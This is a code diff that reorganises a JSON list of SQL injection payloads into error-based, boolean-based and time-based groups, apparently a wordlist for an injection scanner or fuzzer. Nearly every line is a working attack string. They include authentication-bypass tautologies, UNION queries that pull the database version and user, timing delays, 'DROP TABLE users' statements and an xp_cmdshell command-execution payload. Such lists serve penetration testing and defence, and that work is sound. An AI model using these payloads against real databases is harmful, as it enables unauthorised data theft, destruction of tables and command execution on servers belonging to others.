@@ -1,5 +1,5 @@
 {
-  "payloads": [
+  "error_based": [
     "' OR '1'='1",
     "' OR '1'='1' --",
     "' OR '1'='1' /*",
@@ -29,15 +29,6 @@
     "1' GROUP BY 2--",
     "' AND 1=CONVERT(int, (SELECT @@version))--",
     "' AND 1=CONVERT(int, (SELECT user))--",
-    "' WAITFOR DELAY '0:0:5'--",
-    "1; WAITFOR DELAY '0:0:5'--",
-    "'; WAITFOR DELAY '0:0:5'--",
-    "1); WAITFOR DELAY '0:0:5'--",
-    "1)); WAITFOR DELAY '0:0:5'--",
-    "' AND SLEEP(5)--",
-    "1' AND SLEEP(5)--",
-    "' AND BENCHMARK(5000000,MD5('test'))--",
-    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
     "'; DROP TABLE users--",
     "1'; DROP TABLE users--",
     "'; EXEC xp_cmdshell('dir')--",
@@ -48,7 +39,9 @@
     "' UNION SELECT NULL, @@version--",
     "' UNION SELECT NULL, database()--",
     "' UNION SELECT NULL, user()--",
-    "' UNION SELECT NULL, current_user()--",
+    "' UNION SELECT NULL, current_user()--"
+  ],
+  "boolean_based": [
     "' AND 'x'='x",
     "' AND 'x'='y",
     "1' AND '1'='1",
@@ -56,7 +49,18 @@
     "' AND substring(@@version,1,1)='5",
     "' AND substring(@@version,1,1)='4",
     "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
-    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>96--",
+    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>96--"
+  ],
+  "time_based": [
+    "' WAITFOR DELAY '0:0:5'--",
+    "1; WAITFOR DELAY '0:0:5'--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "1); WAITFOR DELAY '0:0:5'--",
+    "1)); WAITFOR DELAY '0:0:5'--",
+    "' AND SLEEP(5)--",
+    "1' AND SLEEP(5)--",
+    "' AND BENCHMARK(5000000,MD5('test'))--",
+    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
     "' AND 1=IF(1=1,SLEEP(5),0)--",
     "' AND IF(1=1,SLEEP(5),0)--"
   ],
